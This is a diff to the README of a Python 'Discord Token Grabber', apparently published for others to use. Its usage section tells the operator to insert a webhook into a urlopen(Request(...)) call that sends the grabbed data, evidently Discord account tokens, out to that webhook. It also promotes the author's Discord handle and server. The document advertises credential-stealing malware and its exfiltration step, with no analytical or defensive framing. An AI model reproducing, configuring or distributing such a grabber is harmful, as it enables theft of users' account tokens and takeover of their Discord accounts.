@@ -3,7 +3,8 @@ Simple Discord Token Grabber in PYTHON
 
 **Usage**:
 
-PUT YOUR WEBHOOK IN **urlopen(Request("PUT YOUR WEBHOOK HERE", data=dumps(webhook).encode(), headers=getheaders()))**
+PUT YOUR WEBHOOK IN 
+**urlopen(Request("PUT YOUR WEBHOOK HERE", data=dumps(webhook).encode(), headers=getheaders()))**
 
 Discord: $MartoBossX#7777 Server: https://discord.gg/ErynDxTV5Y
 
